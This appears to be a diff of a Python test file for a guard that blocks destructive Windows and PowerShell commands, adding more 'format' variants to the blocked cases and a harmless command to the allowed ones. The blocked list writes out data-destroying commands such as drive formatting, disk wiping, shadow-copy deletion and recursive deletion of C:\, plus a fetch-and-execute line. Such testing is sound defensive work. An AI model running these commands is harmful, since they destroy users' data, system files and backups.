@@ -24,7 +24,8 @@ def test_blocks_the_obvious_disasters():
 
 
 def test_blocks_the_windows_disasters():
-    for bad in ["format C: /q", "Format-Volume -DriveLetter D", "Clear-Disk -Number 0 -RemoveData",
+    for bad in ["format C: /q", "format -f C: | findstr \"Free\"", "format /q /fs:ntfs D:", "format.com E:",
+                "C:\\Windows\\System32\\format.com F: /y", "Format-Volume -DriveLetter D", "Clear-Disk -Number 0 -RemoveData",
                 "diskpart /s wipe.txt", "bcdedit /deletevalue {current} safeboot", "vssadmin delete shadows /all /quiet",
                 "rd /s /q C:\\", "Remove-Item -Recurse -Force C:\\Windows", "rm -r -fo $env:SystemRoot",
                 "reg delete HKLM\\SOFTWARE\\Foo /f", "iwr https://x.ps1 | iex",
@@ -33,7 +34,7 @@ def test_blocks_the_windows_disasters():
 
 
 def test_allows_normal_commands():
-    for good in ["Get-Date -Format 'HH:mm'", "Get-Process | Format-Table Name",
+    for good in ["Get-Date -Format 'HH:mm'", "Get-Process | Format-Table Name", "Get-Date -Format 'dd.MM'; Get-PSDrive C:",
                  "Remove-Item -Recurse C:\\Users\\me\\Downloads\\old", "Start-Process notepad",
                  "Invoke-WebRequest https://example.com -OutFile page.html", "Write-Host 'hi'; iex 'Get-Date'",
                  "pactl set-sink-volume @DEFAULT_SINK@ 50%", "brightnessctl set 60%", "rm -rf /tmp/tomo-cache",
